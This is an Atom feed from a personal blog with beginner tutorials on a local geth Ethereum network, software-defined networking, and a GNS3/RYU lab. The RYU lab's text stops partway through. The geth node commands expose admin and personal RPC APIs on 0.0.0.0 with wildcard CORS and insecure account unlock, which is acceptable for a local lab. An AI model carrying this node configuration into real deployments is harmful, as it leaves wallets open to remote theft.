<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="https://www.kmmanoj.me/feed.xml" rel="self" type="application/atom+xml" /><link href="https://www.kmmanoj.me/" rel="alternate" type="text/html" /><updated>2023-03-26T00:49:58-04:00</updated><id>https://www.kmmanoj.me/feed.xml</id><title type="html">Manoj Vignesh K M</title><subtitle>Manoj&apos;s articulated knowledge base of cybersecurity research</subtitle><entry><title type="html">Setting up a local ethereum blockchain network</title><link href="https://www.kmmanoj.me/2023/03/25/setting-up-a-local-ethereum-blockchain-network.html" rel="alternate" type="text/html" title="Setting up a local ethereum blockchain network" /><published>2023-03-25T00:00:00-04:00</published><updated>2023-03-25T00:00:00-04:00</updated><id>https://www.kmmanoj.me/2023/03/25/setting-up-a-local-ethereum-blockchain-network</id><content type="html" xml:base="https://www.kmmanoj.me/2023/03/25/setting-up-a-local-ethereum-blockchain-network.html"><![CDATA[<p>The Ethereum blockchain is similar to the Bitcoin blockchain in that it is a distributed ledger that records all transactions. However, ethereum blockchain provides a platform to build decentralized apps in the form of smart contracts.</p>

<p>Given that the ethereum blockchain is a platform to build decentralised applications, it is key to learn this technology as it may revolutionize the way applications are built.</p>

<p>In this article, we shall go through how to setup a local blockchain network to learn, experiment and build on Ethereum.</p>

<h2 id="installing-geth">Installing geth</h2>

<p>Geth (go-ethereum) is a Go implementation of Ethereum. It is an easy to setup ethereum client. Download and install geth from <a href="https://geth.ethereum.org/downloads">https://geth.ethereum.org/downloads</a></p>

<h2 id="create-the-first-node">Create the first node</h2>

<p>An ethereum blockchain node is any system that has a storage and is able to perform computation (using processor and memory). In geth world, each geth process can be considered the compute scope of a node, and a directory can be considered as an isolated storage space for that node. Hence, we create first node by creating a directory. Let us call it <code class="language-plaintext highlighter-rouge">node00</code>.</p>

<blockquote>
  <p>For ease of reference, <code class="language-plaintext highlighter-rouge">/rootnet</code> shall be used as the base directory</p>
</blockquote>

<p>Create a directory in the base directory by the name <code class="language-plaintext highlighter-rouge">node00</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node00
</code></pre></div></div>

<h2 id="create-the-first-account">Create the first account</h2>

<p>An account, technically, is a cryptographic public-private key pair. An account is referenced by a 40-digit (20 bytes) hex code that is derived from the public key.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">address</span> <span class="o">=</span> <span class="nf">sha3</span><span class="p">(</span><span class="n">publicKey</span><span class="p">)[</span><span class="o">-</span><span class="mi">40</span><span class="p">:]</span>
</code></pre></div></div>

<p>While, the private key is kept safe and secret by the account holder.</p>

<p>To create an account, run:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geth <span class="nt">--datadir</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node00 account new
</code></pre></div></div>

<p>Note down the address of the account displayed.</p>

<h2 id="configure-the-genesis-block">Configure the genesis block</h2>

<p>A genesis block is the very first block in a blockchain network. To create such a block for the blockchain in setup, create a file called <code class="language-plaintext highlighter-rouge">genesis.json</code> in the base directory with the following content:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"config"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"chainId"</span><span class="p">:</span><span class="w"> </span><span class="mi">1337</span><span class="p">,</span><span class="w">
        </span><span class="nl">"homesteadBlock"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"eip155Block"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"eip158Block"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w">
        </span><span class="nl">"eip150Block"</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"difficulty"</span><span class="p">:</span><span class="w"> </span><span class="s2">"400000"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"gasLimit"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2100000"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"alloc"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"&lt;Acc1 Addr&gt;"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nl">"balance"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1000000000000000000"</span><span class="w"> </span><span class="p">},</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>Replace <code class="language-plaintext highlighter-rouge">&lt;Acc1 Addr&gt;</code> with the address of the account created in the previous step. The above configuration allocates <code class="language-plaintext highlighter-rouge">1 ether</code> to the account.</p>

<blockquote>
  <p>chainId 1337 is typically used for geth private chains</p>
</blockquote>

<blockquote>
  <p>EIP stands for Ethereum Improvement Proposal. It is analogous to RFCs in internet world. Refer <a href="https://github.com/ethereum/EIPs/tree/master/EIPS">EIPs github repository</a> to learn more about EIPs.</p>
</blockquote>

<h2 id="initialize-the-first-node">Initialize the first node</h2>

<p>Initialise the ethereum blockchain by running geth and feeding it with the genesis block.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geth <span class="nt">--datadir</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/node00 init <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>/genesis.json
</code></pre></div></div>

<h2 id="optional-ethereum-network-stats-dashboard">[Optional] Ethereum network stats dashboard</h2>

<p>Ethereum network statistics dashboard allows one to visualise the health of different nodes in the ethereum blockchain network. Download ethereum network stats dashboard from github and set it up:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/cubedro/eth-netstats
<span class="nb">cd </span>eth-netstats
npm <span class="nb">install
sudo </span>npm <span class="nb">install</span> <span class="nt">-g</span> grunt-cli
</code></pre></div></div>

<p>Run the ethereum network stats dashboard:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">WS_SECRET</span><span class="o">=</span>eth-netstats-password npm start
</code></pre></div></div>

<blockquote>
  <p>You could use a different <code class="language-plaintext highlighter-rouge">WS_SECRET</code> if necessary.</p>
</blockquote>

<p>The ethereum network stats dashboard should be running at http://localhost:3000</p>

<h2 id="optional-block-explorer---blockscout">[Optional] Block explorer - Blockscout</h2>

<p>Block explorer helps visualise the blocks created and its related information in the ethereum blockchain. Download blockscout from github:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/blockscout/blockscout.git
</code></pre></div></div>

<p>Before starting the visualizer, change all occurence of <code class="language-plaintext highlighter-rouge">host.docker.internal</code> under the blockscout directory to the IP address of your computer. Then, run blockscout:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>blockscout/docker-compose
docker-compose <span class="nt">-f</span> docker-compose-no-build-geth.yml up
</code></pre></div></div>

<p>The block explorer dashboard should be running at http://localhost:4000</p>

<h2 id="start-the-node">Start the node</h2>

<p>Now run the first node</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>geth <span class="nt">--identity</span> <span class="s2">"node00"</span> <span class="nt">--datadir</span><span class="o">=</span>./node00 <span class="nt">--networkid</span><span class="o">=</span>1337 <span class="nt">--syncmode</span><span class="o">=</span>full <span class="nt">--gcmode</span><span class="o">=</span>archive <span class="nt">--http</span> <span class="nt">--http</span>.corsdomain<span class="o">=</span><span class="s2">"*"</span> <span class="nt">--http</span>.api<span class="o">=</span>web3,eth,debug,personal,net,miner,admin <span class="nt">--allow-insecure-unlock</span> <span class="nt">--http</span>.addr <span class="s2">"0.0.0.0"</span> <span class="nt">--http</span>.port 8000 <span class="nt">--authrpc</span>.port 30000 <span class="nt">--port</span> 33000 <span class="nt">--ethstats</span><span class="o">=</span>node00:eth-netstats-password@localhost:3000 <span class="nt">--mine</span>
</code></pre></div></div>

<blockquote>
  <p>Remove <code class="language-plaintext highlighter-rouge">--ethstats</code> option if you skipped step 6</p>
</blockquote>

<p>Note down the enode number in the logs of the process</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
Started P2P networking self=enode://0123456789abcdef0123456...@127.0.0.1:33000
...
</code></pre></div></div>

<h2 id="setup-and-create-other-nodes">Setup and create other nodes</h2>

<p>The other nodes could use <code class="language-plaintext highlighter-rouge">node00</code> as a peer to learn about the blockchain built so far. Hence, in the previous step enode number was noted down so that the new node being created can use <code class="language-plaintext highlighter-rouge">node00</code> as the peer. The <code class="language-plaintext highlighter-rouge">geth.sh</code> file for the node:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

geth <span class="nt">--identity</span> <span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span> <span class="nt">--datadir</span><span class="o">=</span>./<span class="nv">$1</span> <span class="nt">--networkid</span><span class="o">=</span>1337 <span class="nt">--syncmode</span><span class="o">=</span>full <span class="nt">--gcmode</span><span class="o">=</span>archive <span class="nt">--http</span> <span class="nt">--http</span>.corsdomain<span class="o">=</span><span class="s2">"*"</span> <span class="nt">--http</span>.api<span class="o">=</span>web3,eth,debug,personal,net,miner <span class="nt">--allow-insecure-unlock</span> <span class="nt">--bootnodes</span><span class="o">=</span>enode://&lt;the-saved-enode-addr&gt;@127.0.0.1:33000 <span class="nt">--http</span>.port <span class="k">$((</span><span class="m">8000</span><span class="o">+</span><span class="nv">$2</span><span class="k">))</span> <span class="nt">--authrpc</span>.port <span class="k">$((</span><span class="m">30000</span><span class="o">+</span><span class="nv">$2</span><span class="k">))</span> <span class="nt">--port</span> <span class="k">$((</span><span class="m">33000</span><span class="o">+</span><span class="nv">$2</span><span class="k">))</span> <span class="nt">--ethstats</span><span class="o">=</span><span class="nv">$1</span>:eth-netstats-password@localhost:3000 <span class="nt">--mine</span>
</code></pre></div></div>

<p>Replace <code class="language-plaintext highlighter-rouge">&lt;the-saved-enode-addr&gt;</code> with the saved enode address.</p>

<p>To create node n (say node n is identified as node0n):</p>

<ul>
  <li>Create a directory <code class="language-plaintext highlighter-rouge">node0n</code></li>
  <li>Initialize the node with genesis block:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  geth <span class="nt">--datadir</span> /rootnet/node0n init /rootnet/genesis.json
</code></pre></div>    </div>
  </li>
  <li>Create an account
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  geth <span class="nt">--datadir</span> /rootnet/node0n account new
</code></pre></div>    </div>
  </li>
  <li>Run the node
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  ./geth.sh node0n
</code></pre></div>    </div>
  </li>
</ul>

<blockquote>
  <p>To get CLI access to a node, say node00, one could run <code class="language-plaintext highlighter-rouge">geth attach http://localhost:8000</code>. Identify the HTTP port in which the node is running to connect to that node.</p>
</blockquote>

<h2 id="setup-metamask">Setup metamask</h2>

<p>MetaMask is a popular cryptocurrency wallet that enables users to interact with decentralized applications (dApps) on the Ethereum blockchain. It is available in the form of browser extension too.</p>

<p>Download metamask extension for your favorite browser. Then,</p>

<ul>
  <li>Navigate to <code class="language-plaintext highlighter-rouge">Settings &gt; Networks &gt; Add Network</code></li>
  <li>Set <code class="language-plaintext highlighter-rouge">New RPC URL</code> to be <code class="language-plaintext highlighter-rouge">http://localhost:8000</code> [ Recall that this is the http server endpoint served by <code class="language-plaintext highlighter-rouge">node00</code> ]</li>
  <li>Set <code class="language-plaintext highlighter-rouge">Chain ID</code> to be <code class="language-plaintext highlighter-rouge">1337</code></li>
  <li>Set <code class="language-plaintext highlighter-rouge">Network Name</code> and <code class="language-plaintext highlighter-rouge">Currency symbol</code> of your interest.</li>
  <li>Set <code class="language-plaintext highlighter-rouge">Block explorer URL</code> to be <code class="language-plaintext highlighter-rouge">http://localhost:4000</code> [ Ensure you followed the steps to setup <code class="language-plaintext highlighter-rouge">blockscout</code> ]</li>
</ul>

<p>Now, import the account in <code class="language-plaintext highlighter-rouge">node00</code> to metamask.</p>

<ul>
  <li>Select <code class="language-plaintext highlighter-rouge">Import account</code> option displayed in the dropdown menu when clicked on the profile logo on the right top corner of the window.</li>
  <li>Find the private key:
    <ul>
      <li>Install <code class="language-plaintext highlighter-rouge">web3</code> module in python as: <code class="language-plaintext highlighter-rouge">pip3 install web3</code></li>
      <li>In a python interpreter, run the following to retrieve the private key:
        <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="kn">from</span> <span class="n">web3.auto</span> <span class="kn">import</span> <span class="n">w3</span>
  <span class="n">keyfile</span> <span class="o">=</span> <span class="s">'UTC--...'</span>
  <span class="n">password</span> <span class="o">=</span> <span class="s">'&lt;password&gt;'</span>
  <span class="n">w3</span><span class="p">.</span><span class="n">eth</span><span class="p">.</span><span class="n">account</span><span class="p">.</span><span class="nf">decrypt</span><span class="p">(</span><span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'/rootnet/node00/keystore/</span><span class="si">{</span><span class="n">keyfile</span><span class="si">}</span><span class="s">'</span><span class="p">).</span><span class="nf">read</span><span class="p">(),</span> <span class="n">password</span><span class="p">)</span>
</code></pre></div>        </div>
      </li>
    </ul>
  </li>
  <li>Paste the obtained private key in the dialog box that popped up on metamask as <code class="language-plaintext highlighter-rouge">Import account</code> was clicked.</li>
</ul>

<h2 id="write-and-deploy-contract-using-remix">Write and deploy contract using remix</h2>

<p>Remix is a web application that allows users to write, compile and deploy smart contracts to ethereum blockchain networks interactively. It is an IDE for decentralized application development.</p>

<ul>
  <li>Navigate to <a href="https://remix.ethereum.org/">https://remix.ethereum.org/</a></li>
  <li>Select the <code class="language-plaintext highlighter-rouge">Deploy &amp; run transactions</code> option on the left navigation bar</li>
  <li>From the <code class="language-plaintext highlighter-rouge">Environment</code> dropdown, select <code class="language-plaintext highlighter-rouge">Injected Provider - MetaMask</code> option</li>
  <li>The metamask window should pop up asking consent to provide access to remix. Approve it.</li>
  <li>Observe that your account address is seen in the <code class="language-plaintext highlighter-rouge">account</code> field of the <code class="language-plaintext highlighter-rouge">Deploy &amp; run transactions</code> sub-window.</li>
</ul>

<p>Now, you can write a contract or use a pre-existing one in the remix IDE, compile and deploy them to your blockchain network.</p>

<h2 id="reference">Reference</h2>

<p>[1] https://medium.com/datawallet-blog/how-to-deploy-a-local-private-ethereum-blockchain-c2b497f068f4</p>]]></content><author><name></name></author><category term="beginner" /><category term="application" /><category term="blockchain" /><category term="ethereum" /><summary type="html"><![CDATA[Set up a local ethereum blockchain network to learn, experiment, break and build decentralized apps (dApps)]]></summary></entry><entry><title type="html">Software Defined Networks 101</title><link href="https://www.kmmanoj.me/2023/03/10/software-defined-networks-101.html" rel="alternate" type="text/html" title="Software Defined Networks 101" /><published>2023-03-10T23:00:00-05:00</published><updated>2023-03-10T23:00:00-05:00</updated><id>https://www.kmmanoj.me/2023/03/10/software-defined-networks-101</id><content type="html" xml:base="https://www.kmmanoj.me/2023/03/10/software-defined-networks-101.html"><![CDATA[<p>Software Defined Networking, abbreviated as SDN, is an approach to networking that separates the control plane from the data plane. This architecture allows for management and configuration of network by administrators through software rather than through hardware. Overall, SDN allows for easier scaling and management of the network, and consequently allows development of better network automation capabilities. Further, similar to how virtualization revolutionized utilization of compute systems, SDN in conjunction with NFV (Network Function Virtualization) better utilizes the compute systems for networking.</p>

<p>Before diving into technical details of SDN, one needs to understand the difference between control plane and data plane.</p>

<h2 id="control-plane-vs-data-plane">Control plane vs Data plane</h2>

<p>The control plane is a subset of the network that deals with functional traffic. The functional traffic includes those packets and protocols used to learn about the network and use that information to handle and route packets coming to it. For example, the L3 (OSI level 3 - network layer) network switches exchange OSPF packets in control plane and use this information to learn about the network and evaluate the next hop for packets flowing in the data plane. The data plane is the other subset of the network that deals with consumer traffic. The consumer traffic includes those packets that are exchanged for business purposes. For example, a HTTP packet from a computer to kmmanoj.me server asking for the kmmanoj website’s home page runs on the data plane.</p>

<h3 id="analogies-for-control-plane-vs-data-plane">Analogies for control plane vs data plane</h3>

<ul>
  <li>The time spent to chart an action plan happens in control plane, while the time spent in executing the action plan happens in data plane.</li>
  <li>In a business setting, the services and money involved between the organization and the employees happen in control plane. While, the services and money involved between the organization and the customers happen in data plane.</li>
  <li>In a computer systems setting, the CPU utilized by the Operating System happens in control plane, while the CPU utilized for user processes happen in data plane.</li>
</ul>

<h3 id="traditional-network-vs-software-defined-network">Traditional Network vs Software Defined Network</h3>

<p>In a traditional network, the control plane traffic and the data plane intersect significantly as soon in the illustration below. The brain of the network is distributed across different network devices, and they work in tandem to move packets in data plane from one end to another end.</p>

<p><img src="/assets/img/sdn101/traditional.png" alt="Figure 1: Traditional Network" />
<br /><small style="color: gray">Figure 1: Traditional Network</small><br /></p>

<p>While, in SDN the control plane is separated from the data plane as shown in the illustration below. The brain of the network is centralized at the SDN controller. The SDN switches and routers consult the SDN controller to determine what action to take for this packet.</p>

<p>To avoid burdening the SDN controller for every packet by every switch, the SDN controller could install rules in SDN switches and routers which could be of the (simplest) form (in RYU controller):</p>

<p><code class="language-plaintext highlighter-rouge">if(condition X) perform action Y</code></p>

<p>For example, condition X can be, packet is entering port <code class="language-plaintext highlighter-rouge">swt0</code> and the corresponding action Y can be packet should exit port <code class="language-plaintext highlighter-rouge">swt1</code>. This way whenever an SDN switch that has the above rule installed receives a packet from port <code class="language-plaintext highlighter-rouge">swt0</code> it would route the packet to port <code class="language-plaintext highlighter-rouge">swt1</code> without consulting the SDN controller.</p>

<p><img src="/assets/img/sdn101/sdn.png" alt="Figure 2: SDN Network" />
<br /><small style="color: gray">Figure 2: SDN Network</small><br /></p>

<p>That is a short introduction about Software Defined Networks. I hope you gained a basic understanding of SDN is different from traditional networks and what are the basic constructs and components of an SDN network.</p>]]></content><author><name></name></author><category term="beginner" /><category term="concept" /><category term="sdn" /><category term="cloud" /><category term="networking" /><summary type="html"><![CDATA[A (very) brief introduction about Software Defined Networks]]></summary></entry><entry><title type="html">Using GNS3 to learn SDN</title><link href="https://www.kmmanoj.me/2023/03/10/using-gns3-to-learn-sdn.html" rel="alternate" type="text/html" title="Using GNS3 to learn SDN" /><published>2023-03-10T23:00:00-05:00</published><updated>2023-03-10T23:00:00-05:00</updated><id>https://www.kmmanoj.me/2023/03/10/using-gns3-to-learn-sdn</id><content type="html" xml:base="https://www.kmmanoj.me/2023/03/10/using-gns3-to-learn-sdn.html"><![CDATA[<p><a href="https://www.gns3.com/">GNS3</a> is a network simulation platform for creating and testing virtual networks with routers, switches, and other devices. There are many other alternatives to GNS3, but I personally prefer GNS3 since the UI is user friendly, supports multiple types of network devices and protocols and more importantly has integrations with Docker, VirtualBox and VMware.</p>

<p>In one of my <a href="/2023/03/10/software-defined-networks-101.html">previous blog articles</a>, I presented a brief and elementary introduction about Software Defined Networks. In this blog article, we shall walk through setting up GNS3, and further implement a simple controller using RYU framework on a network of SDN switches in GNS3.</p>

<h2 id="setup">Setup</h2>

<h3 id="installing-gns3">Installing GNS3</h3>

<p>Follow the instructions provided in the GNS3 documentation to install GNS3 in your computer system. The following link references a document that walk’s through installation of GNS3 server and client in a linux machine: <a href="https://docs.gns3.com/docs/getting-started/installation/linux">https://docs.gns3.com/docs/getting-started/installation/linux</a>. The navigation bar on the left has installation instructions for other OSes.</p>

<h3 id="downloading-open-vswitch">Downloading Open vSwitch</h3>

<p>Once GNS3 is installed on your computer system, let us import Open vSwitch appliance into GNS3.</p>

<p><em>Note: The following instructions are based on GNS3 macOS client version 2.2.37</em></p>

<ul>
  <li>On the left vertical navigation bar, select one of the icons to open a drawer showcasing list of available devices. On the bottom of this drawer, click on the button that says “New template”.</li>
  <li>A new window with the title “New template” opens. Select “Install an appliance from the GNS3 server (recommended)” option (It is selected by default) and click “Next &gt;” on the bottom corner of the window.</li>
  <li>Click on “Update from online registry” to fill the appliances list.</li>
  <li>Once the appliance list is filled, find and click “Open vSwitch” under the “Switches” accordion as illustrated in Figure 1. Then click on “Install” found in the bottom corner of the window.</li>
  <li>For simplicity, use the default settings for the rest of the installation process.</li>
</ul>

<p><img src="/assets/img/gns-sdn/fig1.png" alt="Figure 1: Filled appliance list (As of Mar 11, 2023)" />
<br /><small style="color: gray">Figure 1: Filled appliance list (As of Mar 11, 2023)</small><br /></p>

<h3 id="setting-up-ryu">Setting up RYU</h3>

<p>RYU is going to be set up on your host machine (or, in the gns3 server if you are using one). This section shows how to setup RYU in a linux or *nix based machine.</p>

<ul>
  <li>Assuming that you have <code class="language-plaintext highlighter-rouge">python3</code> , <code class="language-plaintext highlighter-rouge">pip3</code>, and <code class="language-plaintext highlighter-rouge">virtualenv</code> installed in your host machine, create a virtual environment by running the following command: <code class="language-plaintext highlighter-rouge">virtualenv venv</code></li>
  <li>Activate the created virtual environment by running: <code class="language-plaintext highlighter-rouge">source ./venv/bin/activate</code></li>
  <li>Install ryu for this environment by running: <code class="language-plaintext highlighter-rouge">pip install ryu</code></li>
</ul>

<blockquote>
  <p><strong>NOTE</strong>: Before moving forward ensure that ryu is correctly installed and is working by running <code class="language-plaintext highlighter-rouge">ryu-manager</code> in a terminal with <code class="language-plaintext highlighter-rouge">venv</code> active.</p>
</blockquote>

<h2 id="simple-experiment">Simple Experiment</h2>

<p>In this experiment, a network containing a single Open vSwitch will be used. The Open vSwitch will be connected to the controller (host machine) through a NAT at <code class="language-plaintext highlighter-rouge">eth0</code>. Two host computers will connect to the switch at <code class="language-plaintext highlighter-rouge">eth1</code> and <code class="language-plaintext highlighter-rouge">eth2</code>. The goal is to enable communication between the two hosts through the switch.</p>

<h3 id="configure-open-vswitch">Configure Open vSwitch</h3>

<p>Figure 2 illustrates the network topology used for this experiment. Before starting up the Open vSwitch node, right click on the node to “edit config”. Uncomment the section under <code class="language-plaintext highlighter-rouge"># DHCP config for eth0</code> . By this configuration, the switch’s <code class="language-plaintext highlighter-rouge">eth0</code> interface will obtain IP address and other details from the DHCP server which is <code class="language-plaintext highlighter-rouge">NAT1</code> in this case.</p>

<blockquote>
  <p>Recall: Other details?</p>
</blockquote>

<p><img src="/assets/img/gns-sdn/fig2.png" alt="Figure 2: Network topology and OVS configuration" />
<br /><small style="color: gray">Figure 2: Network topology and OVS configuration</small><br /></p>

<p>Then, start the Open vSwitch node and spawn an Auxiliary console. In the console, enter the following command to instruct the switch to use the specified controller for the specified bridge.</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Set controller IP</span>
ovs-vsctl set-controller br0 tcp:192.168.122.1:6633</code></pre></figure>

<blockquote>
  <p>Ensure that the IP address used in the above command is in fact the IP address of one of the interfaces on your host machine where GNS3 server is installed.</p>
</blockquote>

<h3 id="configure-the-pcs">Configure the PCs</h3>

<p>Similar to the switch, right click on each PC and edit their configuration. Set manual IP address by inserting the following configuration in PC1 and PC2 respectively:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># For PC1</span>
ip 10.0.0.10/24 10.0.0.1</code></pre></figure>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># For PC2</span>
ip 10.0.0.11/24 10.0.0.1</code></pre></figure>

<p>Verify that the two PCs are not be able to ping each other.</p>

<p><img src="/assets/img/gns-sdn/fig3.png" alt="Figure 3: The PCs will not be able to ping each other" />
<br /><small style="color: gray">Figure 3: The PCs will not be able to ping each other</small><br /></p>

<h3 id="configure-the-controller">Configure the controller</h3>

<p>Let us begin by writing the controller framework. In your host machine, create a file by the name <code class="language-plaintext highlighter-rouge">controller.py</code> and fill in with the following code:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">ryu.base</span> <span class="kn">import</span> <span class="n">app_manager</span>
<span class="kn">from</span> <span class="n">ryu.controller</span> <span class="kn">import</span> <span class="n">ofp_event</span>
<span class="kn">from</span> <span class="n">ryu.controller.handler</span> <span class="kn">import</span> <span class="n">MAIN_DISPATCHER</span><span class="p">,</span> <span class="n">CONFIG_DISPATCHER</span>
<span class="kn">from</span> <span class="n">ryu.controller.handler</span> <span class="kn">import</span> <span class="n">set_ev_cls</span>
<span class="kn">from</span> <span class="n">ryu.ofproto</span> <span class="kn">import</span> <span class="n">ofproto_v1_3</span>

<span class="k">class</span> <span class="nc">Hub</span><span class="p">(</span><span class="n">app_manager</span><span class="p">.</span><span class="n">RyuApp</span><span class="p">):</span>
    <span class="n">OFP_VERSIONS</span> <span class="o">=</span> <span class="p">[</span> <span class="n">ofproto_v1_3</span><span class="p">.</span><span class="n">OFP_VERSION</span> <span class="p">]</span>

    <span class="nd">@set_ev_cls</span><span class="p">(</span><span class="n">ofp_event</span><span class="p">.</span><span class="n">EventOFPSwitchFeatures</span> <span class="p">,</span> <span class="n">CONFIG_DISPATCHER</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">switch_features_handler</span><span class="p">(</span><span class="n">self</span> <span class="p">,</span> <span class="n">ev</span><span class="p">):</span>
        <span class="n">dp</span> <span class="o">=</span> <span class="n">ev</span><span class="p">.</span><span class="n">msg</span><span class="p">.</span><span class="n">datapath</span>
        <span class="n">ofproto</span> <span class="o">=</span> <span class="n">dp</span><span class="p">.</span><span class="n">ofproto</span>
        <span class="n">ofp_parser</span> <span class="o">=</span> <span class="n">dp</span><span class="p">.</span><span class="n">ofproto_parser</span>

        <span class="n">match</span> <span class="o">=</span> <span class="n">ofp_parser</span><span class="p">.</span><span class="nc">OFPMatch</span><span class="p">()</span>
        <span class="n">actions</span> <span class="o">=</span> <span class="p">[</span> 
            <span class="n">ofp_parser</span><span class="p">.</span><span class="nc">OFPActionOutput</span><span class="p">(</span>
                <span class="n">ofproto</span><span class="p">.</span><span class="n">OFPP_CONTROLLER</span><span class="p">,</span> 
                <span class="n">ofproto</span><span class="p">.</span><span class="n">OFPCML_NO_BUFFER</span>
            <span class="p">)</span> 
        <span class="p">]</span>
        <span class="n">ins</span> <span class="o">=</span> <span class="p">[</span> 
            <span class="n">ofp_parser</span><span class="p">.</span><span class="nc">OFPInstructionActions</span><span class="p">(</span>
                <span class="n">ofproto</span><span class="p">.</span><span class="n">OFPIT_APPLY_ACTIONS</span><span class="p">,</span> 
                <span class="n">actions</span>
            <span class="p">)</span> 
        <span class="p">]</span>

        <span class="n">out</span> <span class="o">=</span> <span class="n">ofp_parser</span><span class="p">.</span><span class="nc">OFPFlowMod</span><span class="p">(</span><span class="n">datapath</span><span class="o">=</span><span class="n">dp</span><span class="p">,</span> <span class="n">match</span><span class="o">=</span><span class="n">match</span><span class="p">,</span> <span class="n">instructions</span><span class="o">=</span><span class="n">ins</span><span class="p">)</span>
        <span class="n">dp</span><span class="p">.</span><span class="nf">send_msg</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>

    <span class="nd">@set_ev_cls</span><span class="p">(</span><span class="n">ofp_event</span><span class="p">.</span><span class="n">EventOFPPacketIn</span><span class="p">,</span> <span class="n">MAIN_DISPATCHER</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">packet_in_handler</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">ev</span><span class="p">):</span>
        <span class="n">msg</span> <span class="o">=</span> <span class="n">ev</span><span class="p">.</span><span class="n">msg</span>
        <span class="n">dp</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">datapath</span>
        <span class="n">ofp</span> <span class="o">=</span> <span class="n">dp</span><span class="p">.</span><span class="n">ofproto</span>
        <span class="n">ofp_parser</span> <span class="o">=</span> <span class="n">dp</span><span class="p">.</span><span class="n">ofproto_parser</span>

        <span class="n">actions</span> <span class="o">=</span> <span class="p">[</span> <span class="n">ofp_parser</span><span class="p">.</span><span class="nc">OFPActionOutput</span><span class="p">(</span><span class="n">ofp</span><span class="p">.</span><span class="n">OFPP_FLOOD</span><span class="p">)</span> <span class="p">]</span>

        <span class="n">data</span> <span class="o">=</span> <span class="bp">None</span>
        <span class="k">if</span> <span class="n">msg</span><span class="p">.</span><span class="n">buffer_id</span> <span class="o">==</span> <span class="n">ofp</span><span class="p">.</span><span class="n">OFP_NO_BUFFER</span><span class="p">:</span>
             <span class="n">data</span> <span class="o">=</span> <span class="n">msg</span><span class="p">.</span><span class="n">data</span>

        <span class="n">out</span> <span class="o">=</span> <span class="n">ofp_parser</span><span class="p">.</span><span class="nc">OFPPacketOut</span><span class="p">(</span>
            <span class="n">datapath</span><span class="o">=</span><span class="n">dp</span><span class="p">,</span> <span class="n">buffer_id</span><span class="o">=</span><span class="n">msg</span><span class="p">.</span><span class="n">buffer_id</span><span class="p">,</span> 
            <span class="n">in_port</span><span class="o">=</span><span class="n">msg</span><span class="p">.</span><span class="n">match</span><span class="p">[</span><span class="s">'in_port'</span><span class="p">],</span>
            <span class="n">actions</span><span class="o">=</span><span class="n">actions</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">)</span>
        <span class="n">dp</span><span class="p">.</span><span class="nf">send_msg</span><span class="p">(</span><span class="n">out</span><span class="p">)</span></code></pre></figure>

